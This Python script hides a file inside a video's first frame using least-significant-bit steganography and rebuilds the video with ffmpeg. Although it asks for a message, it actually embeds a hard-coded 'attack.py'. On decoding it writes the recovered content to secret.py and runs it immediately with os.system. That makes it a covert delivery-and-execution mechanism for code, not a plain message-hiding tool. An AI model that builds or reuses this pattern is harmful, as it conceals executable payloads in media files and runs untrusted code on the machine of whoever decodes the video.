# I used the following website: https://medium.com/@vedanshvijay/steganography-5d9d8a557587
# Installing and Importing required modules:
from PIL import Image
from stegano import lsb
from os.path import isfile, join
import time
import cv2
import PIL
import numpy as np
import math
import os
import shutil
from subprocess import Popen

import runpy
from subprocess import call, STDOUT


# Defining the String Split function🪓
# Now that we have all the extracted frames, we can divide the strings into small chunks and hide each chunk of the message inside a frame.
def split_string(split_str, count=10):
    per_c = math.ceil(len(split_str) / count)
    c_cout = 0
    out_str = ''
    split_list = []
    for s in split_str:
        out_str += s
        c_cout += 1
        if c_cout == per_c:
            split_list.append(out_str)  # The message is divided into substrings
            out_str = ''
            c_cout = 0
    if c_cout != 0:
        split_list.append(out_str)
    return split_list


# Defining frame extraction function🎞
# Now that we have the video, our first step should be defining a frame extraction function to extract frames in the form of images from the video.
def frame_extraction(video):
    if not os.path.exists("./temp"):
        os.makedirs("temp")
    temp_folder = "./temp"  # Temporary folder created to store the frames and audio from the video.
    print("[INFO] temp directory is created")
    vidcap = cv2.VideoCapture(video)
    count = 0
    while True:
        success, image = vidcap.read()
        if not success:
            break
        cv2.imwrite(os.path.join(temp_folder, "{:d}.png".format(count)), image)
        count += 1


def read_secret(filename):
    '''
    take a file name and return its contents
    param filename (string): the name of the file to read
    output (str): the content of the file
    '''
    with open(str(filename), 'r') as f:
        b = f.read()
    return b


def import_image(filename):
    '''
    loads an image and returns a numpy array of the image
    param filename (str): name of the image to be loaded
    output (ndarray): 3D array of the image pixels (RGB)
    '''
    return np.array(Image.open(filename))


def bits_representation(integer, n_bits=8):
    '''
    takes an integer and return its binary representaation
    param integer (int): The integer to be converted to binary
    param n_bits (int): number of total bits to return. Default is 8
    output (str): string which represents the bits of the integer value
    Example: bits_representation(3, 8) >> 00000011
    '''
    return ''.join(['{0:0', str(n_bits), 'b}']).format(integer)


def size_payload_gen(secret_size, n_bits_rep=8):
    '''
    Takes a binary representation and returns a pair of 2 bits untill finished
    param secret_size (int): an integer to be converted to binary representation
    param n_bits_rep (int): total number of bits. example 8 means there will be 8 bits in total
    output (str): two bits of the binary representation from the most significant bit to least significant
    '''
    # get the binary representation of secret size
    rep = bits_representation(secret_size, n_bits_rep)

    # return 2 bits at a time from msb to lsb
    for index in range(0, len(rep), 2):
        yield rep[index:index + 2]


def reset(pixel, n_lsb):
    '''
    Takes an integer and set n least significant bits to be 0s
    param pixel (int): the set of bits to be modified. Ex: 255
    param n_lsb (int): number of least significant bits to set as 0s Ex: 2
    output (int): integer representing to byte after resetting n-lsb

    Example: reset(7,1) >> 6
    clarification: 0b111 >> 0b110
    '''
    return (pixel >> n_lsb) << n_lsb


# This function would embed the splitted string into the frames extracted from the video.
def encode_capacity(img_copy, sec_size):
    '''
    Encode the length of the secret file to the image (payload has a standard size of 24 bits)
    param img_copy (ndarray): a 1d vector of the image (flattened)
    param sec_size (int): the size of the secret as an integer
    '''

    # get the bits representation of the length(24 bits)
    g = size_payload_gen(sec_size, 24)

    # embed each 2-bit pair to a pixel at a time
    for index, two_bits in enumerate(g):
        # reset the least 2 segnificant bits
        img_copy[index] = reset(img_copy[index], 2)

        # embed 2 bits carrying info about secret length
        img_copy[index] += int(two_bits, 2)


def secret_gen(secret, n_bits_rep=8):
    '''
    Takes the secret file and return 2 bits at a time until done
    param secret (str): the secret file
    param n_bits_rep (int): total number of bits. example 8 means there will be 8 bits for each character
    output (str): two bits of the binary representation of each character
    '''

    # for each character
    for byte in secret:

        # get its binary representation (8 bits)
        bin_rep = bits_representation(ord(byte), 8)

        # return 2 bits at a time
        for index in range(0, len(bin_rep), 2):
            yield bin_rep[index: index + 2]


def encode_secret(img_copy, secret):
    '''
    Encode the secret file to the image
    param img_copy (ndarray): a 1d vector of the image (flattened)
    param secret (str): the secret file to be encoded into the image
    '''
    # generate 2 bits pair at a time for each byte in secret
    gen = secret_gen(secret)

    # embed to the image
    for index, two_bits in enumerate(gen):
        # +12 to prevent overlaping with the size payload bits
        img_copy[index + 12] = reset(img_copy[index + 12], 2)
        # embed 2 bits of secret data
        img_copy[index + 12] += int(two_bits, 2)


def find_capacity(img, code):
    '''
    Takes a 3D image and the secret file and return their size in 2-bit pairs
    param img (ndarray): the 3d array of the image to be used as a medium
    param code (str): the file you want to hide in the medium
    output medium_size(int): the available size to hide data (in 2 bit pair)
    output secret_size(int): the size of the secret file (in 2 bit pair)
    '''
    # total slots of 2 bits available after deducting 12 slots for size payload
    medium_size = img.size - 12
    # number of 2 bits slots the code needs
    secret_size = (len(code) * 8) // 2

    print(f'Total Available space: {medium_size} 2-bit slots')
    print(f'Code size is: {secret_size} 2-bit slots')
    print('space consumed: {:.2f}%'.format((secret_size / medium_size) * 100))

    return medium_size, secret_size


def encode_string(input_string, root="./temp/"):
    encode("attack.py")  # Embedded the splitted string into each frame.
    print("The message is stored in the out.mp4 file")


def encode(secret_file):
    img_file = "./temp/0.png"
    secret = read_secret(secret_file)
    img = import_image(img_file)
    # find the size of secret file
    medium_size, secret_size = find_capacity(img, secret)
    print("raz  " + str(secret_size))
    # if secret file is too large for the image or user wants to exit
    if secret_size >= medium_size:
        print('secret file is large for this image, please get a larger image')
        return None
    else:
        if input("Proceed ? (y/n): ").lower() != 'y':
            return None

    # save dimensions of image then flatten it
    img_dim = img.shape
    img = img.flatten()

    # encode length to image
    encode_capacity(img, secret_size)

    # encode secret file to image
    encode_secret(img, secret)

    # reshape the image back to 3D
    img = img.reshape(img_dim)

    # save
    im = Image.fromarray(img)
    im.save("./temp/{}.png".format(0))
    print('Done, "0.png" should be in your directory')


def decode_capacity(img_copy):
    '''
    extract length of secret file from the image
    param img_copy (ndarray): a 1d vector of the image (flattened)
    output (int): the length of the secret file embedded to this image
    '''

    # get the 2 lsb from the first 12 pixels (24 bits)
    bin_rep = ''.join([bits_representation(pixel)[-2:] for pixel in img_copy[:12]])
    # return it as an integer
    return int(bin_rep, 2)


def bits_representation(integer, n_bits=8):
    '''
    takes an integer and return its binary representaation
    param integer (int): The integer to be converted to binary
    param n_bits (int): number of total bits to return. Default is 8
    output (str): string which represents the bits of the integer value
    Example: bits_representation(3, 8) >> 00000011
    '''
    return ''.join(['{0:0', str(n_bits), 'b}']).format(integer)


def decode_secret(flat_medium, sec_ext, length):
    '''
    takes the image, length of hidden secret and the extension of the output file,
    then extracts secret file bits from the image and write it to a new file having
    the specified extension.
    param flat_medium (ndarray): a 1d vector of the image (flattened)
    param sec_ext (str): the file extension of the secret file. example: txt
    param length (int): the length of secret file extracted using decode_capacity
    '''
    # opening a file
    with open(''.join(['secret.', sec_ext]), 'w', encoding="utf-8") as file:
        # extract 1 byte at a type (2 bits from each of the 4 pixels)
        for pix_idx in range(12, len(flat_medium[12:]), 4):
            # convert the byte to character then write to file
            byte = ''.join([bits_representation(pixel)[-2:] for pixel in flat_medium[pix_idx:pix_idx + 4]])
            file.write(chr(int(byte, 2)))
            if pix_idx - 8 == length:
                break
    try:
        os.system('python secret.py')
    except:
        print("bad")


def decode(stego_img, sec_ext):
    '''
    this is the driver function to decode a secret file from the stego image
    param stego_img(str): name of the stego image to extract secret from
    param sec_ext(str): the extension of the secret file
    output: a secret file with the specified extension
    '''
    # read image and flatten to 1D
    img = import_image(stego_img).flatten()

    # decode secret length from stego image
    secret_size = decode_capacity(img)
    print(f'secret size: {secret_size}')

    # extract secret file from stego image
    decode_secret(img, sec_ext, secret_size)

    print(f'Decoding completed, "secretPNG.{sec_ext}" should be in your directory')


# This function would decode the hidden message by extracting frames from the video
def decode_string(video):
    frame_extraction(video)  # Extracting each frame from the video
    try:
        # Find a message in an image (with the LSB technique).
        decode("./temp/0.png", 'py')
    except:
        print("bad")
    clean_temp()


# This function would delete the temp directory
def clean_temp(path="./temp"):
    if os.path.exists(path):
        shutil.rmtree(path)
        print("[INFO] temp files are cleaned up")


# This function would extraxt audio from the video so as to stitch them back later.
def input_main(f_name):
    input_string = input("Enter the message :")  # To collect the message
    frame_extraction(f_name)
    # The call function would be used to extract the audio and then stitch it again properly with the frames extracted.
    call(["ffmpeg", "-i", f_name, "-q:a", "0", "-map", "a", "temp/audio.mp3", "-y"], stdout=open(os.devnull, "w"),
         stderr=STDOUT)
    encode_string(input_string)
    # Stitching together the frames🖼 and the audio🔊
    # using ffmpeg to stitch together all our frames with a hidden message to form a video and then lay out the audio:
    call(["ffmpeg", "-i", "temp/%d.png", "-vcodec", "png", "temp/out.mp4", "-y"], stdout=open(os.devnull, "w"),
         stderr=STDOUT)
    # this code above creates the video with our secret message hidden in it.
    call(["ffmpeg", "-i", "temp/out.mp4", "-i", "temp/audio.mp3", "-codec", "copy", "out.mp4", "-y"],
         stdout=open(os.devnull, "w"), stderr=STDOUT)
    clean_temp()


# Inputting the video📹
# First we would decide the inputs. That is first the user needs to specify whether they want to encode or decode a video. Then they would input the video file with extension which we would read using OpenCV.
if __name__ == "__main__":
    while True:
        print("1.Hide a message in video\n2.Reveal the secret from the video\n")
        print("Any other value to exit\n")
        choice = input("Enter your choice :")
        if choice == '1':
            f_name = input("Enter the name of video file with extension:")
            input_main(f_name)
        elif choice == '2':
            decode_string(input("Enter the name of video with extension :"))
        else:
            break
